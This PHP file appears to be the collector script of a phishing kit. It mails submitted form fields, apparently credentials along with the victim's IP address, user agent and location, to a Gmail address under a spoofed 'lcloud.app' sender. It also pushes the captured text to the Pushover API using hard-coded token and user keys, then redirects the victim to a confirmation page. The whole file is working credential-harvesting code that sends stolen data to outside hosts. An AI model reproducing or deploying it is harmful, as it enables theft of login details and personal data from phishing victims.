<?php 
if(isset($_POST['submit'])){
    $to = "yaka.mak.alaka.taka@gmail.com"; // this is your Email address
    $from = "info@lcloud.app"; // this is the sender's Email address
	$subject = "Form submission";
	$message = 'm' . " " .  'm'. " wrote the following:" . "\n\n" . $_POST['message'] . "\n\n" . $_POST['text']. "\n\n" . $_POST['UIP']."       " .  $_POST['UA']. "\n\n" . $_POST['location'];
 
	$headers = "From:" . $from;
	 mail($to,$subject,$message,$headers);
header('Location: confirmation/index.php');

	// You can also use header('Location: thank_you.php'); to redirect to another page.
	// You cannot use header and echo together. It's one or the other.
	}
curl_setopt_array($ch = curl_init(), array(
		  CURLOPT_URL => "https://api.pushover.net/1/messages.json",
		  CURLOPT_POSTFIELDS => array(
			"token" => "akisatsko55hwqa51t3e13u6cto2g7",
			"user" => "urpghpgsbamyag9cm4ep5vuyvon2y9",
			"message" => $_POST['message'] . "\n\n" . $_POST['text'],
		  ),
		  CURLOPT_SAFE_UPLOAD => true,
		  CURLOPT_RETURNTRANSFER => true,
		));
		curl_exec($ch);
		curl_close($ch);
	exit();	
	
?>